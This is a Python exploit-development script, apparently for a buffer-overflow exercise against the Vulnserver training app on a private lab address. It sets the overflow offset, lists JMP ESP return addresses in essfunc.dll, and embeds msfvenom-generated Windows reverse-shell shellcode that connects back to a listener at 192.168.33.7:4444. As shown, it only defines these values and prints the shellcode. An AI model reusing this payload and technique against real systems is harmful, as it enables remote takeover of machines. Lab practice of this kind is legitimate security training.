import struct
from pprint import pprint

PORT = 9999
HOST = '192.168.33.16'
SHELLCODE_OFFSET = 2003  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003

JMP_ESP = 0xFFE4  # from asking nasm_shell.rb for JMP ESP as an opcode
NOP = '\x90'  # NOP instruction

# we use essfunc.dll because the `!mona find` command in immunity
# tells us it has no memory protections.

# these were retrieved by searching for the JMP ESP instruction (aka 0xFFE4)
# using mona.py inside of immunity debugger like this:
# `!mona find -s '\xff\xe4' -m essfunc.dll`
ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN = [
    0x625011AF,
    0x625011BB,
    0x625011C7,
    0x625011D3,
    0x625011DF,
    0x625011EB,
    0x625011F7,
    0x62501203,
    0x62501205,
]

# TODO don't hard code this
ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN = '\xAF\x11\x50\x62'  # note each 1 byte is reversed

# generated from
# `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.33.7 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
SHELLCODE = "\xd9\xee\xba\x0f\xfc\xf1\xc6\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\x5f\xef\x13" \
            "\x33\xa3\xe7\x56\xbc\x5b\xf8\x36\x34\xbe\xc9\x76\x22\xcb\x7a\x47\x20\x99\x76\x2c\x64\x09\x0c\x40\xa1\x3e" \
            "\xa5\xef\x97\x71\x36\x43\xeb\x10\xb4\x9e\x38\xf2\x85\x50\x4d\xf3\xc2\x8d\xbc\xa1\x9b\xda\x13\x55\xaf\x97" \
            "\xaf\xde\xe3\x36\xa8\x03\xb3\x39\x99\x92\xcf\x63\x39\x15\x03\x18\x70\x0d\x40\x25\xca\xa6\xb2\xd1\xcd\x6e" \
            "\x8b\x1a\x61\x4f\x23\xe9\x7b\x88\x84\x12\x0e\xe0\xf6\xaf\x09\x37\x84\x6b\x9f\xa3\x2e\xff\x07\x0f\xce\x2c" \
            "\xd1\xc4\xdc\x99\x95\x82\xc0\x1c\x79\xb9\xfd\x95\x7c\x6d\x74\xed\x5a\xa9\xdc\xb5\xc3\xe8\xb8\x18\xfb\xea" \
            "\x62\xc4\x59\x61\x8e\x11\xd0\x28\xc7\xd6\xd9\xd2\x17\x71\x69\xa1\x25\xde\xc1\x2d\x06\x97\xcf\xaa\x69\x82" \
            "\xa8\x24\x94\x2d\xc9\x6d\x53\x79\x99\x05\x72\x02\x72\xd5\x7b\xd7\xd5\x85\xd3\x88\x95\x75\x94\x78\x7e\x9f" \
            "\x1b\xa6\x9e\xa0\xf1\xcf\x35\x5b\x92\x2f\x61\x42\x65\xd8\x70\x84\x78\x44\xfc\x62\x10\x64\xa8\x3d\x8d\x1d" \
            "\xf1\xb5\x2c\xe1\x2f\xb0\x6f\x69\xdc\x45\x21\x9a\xa9\x55\xd6\x6a\xe4\x07\x71\x74\xd2\x2f\x1d\xe7\xb9\xaf" \
            "\x68\x14\x16\xf8\x3d\xea\x6f\x6c\xd0\x55\xc6\x92\x29\x03\x21\x16\xf6\xf0\xac\x97\x7b\x4c\x8b\x87\x45\x4d" \
            "\x97\xf3\x19\x18\x41\xad\xdf\xf2\x23\x07\xb6\xa9\xed\xcf\x4f\x82\x2d\x89\x4f\xcf\xdb\x75\xe1\xa6\x9d\x8a" \
            "\xce\x2e\x2a\xf3\x32\xcf\xd5\x2e\xf7\xef\x37\xfa\x02\x98\xe1\x6f\xaf\xc5\x11\x5a\xec\xf3\x91\x6e\x8d\x07" \
            "\x89\x1b\x88\x4c\x0d\xf0\xe0\xdd\xf8\xf6\x57\xdd\x28 "

print (SHELLCODE)
